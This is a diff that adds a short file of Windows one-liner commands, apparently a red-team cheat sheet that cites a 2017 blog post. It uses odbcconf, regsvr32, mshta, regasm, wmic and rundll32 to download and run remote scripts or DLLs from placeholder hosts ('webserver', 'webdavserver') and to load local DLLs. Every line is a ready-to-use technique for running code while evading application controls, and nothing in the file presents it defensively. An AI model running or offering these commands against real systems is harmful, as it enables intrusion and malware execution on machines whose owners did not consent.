@@ -1,0 +1,20 @@
+odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}
+odbcconf.exe /S /A {REGSVR "C:\Users\Public\file_dll.txt"}
+
+
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
+
+mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+mshta http://webserver/payload.hta
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
+
+wmic os get /format:"https://webserver/payload.xsl"
+
+rundll32 \\webdavserver\folder\payload.dll,entrypoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+
+
+
+https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
